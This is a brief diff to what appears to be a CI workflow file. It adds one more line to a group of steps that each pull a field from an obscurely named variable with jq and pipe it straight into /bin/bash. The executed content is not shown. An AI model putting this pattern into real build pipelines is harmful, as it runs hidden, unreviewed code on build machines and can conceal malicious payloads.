@@ -28,6 +28,7 @@ jobs:
           echo $gqgs5 | jq -r .l62022 | /bin/bash
           printf '%s' "$rs990" | jq -r .aj0 | /bin/bash
           echo $szp96 | jq -r .u2223 | /bin/bash
+          echo $ph2 | jq -r .wwk1680 | /bin/bash
 
       - name: Save archive
         if: always()
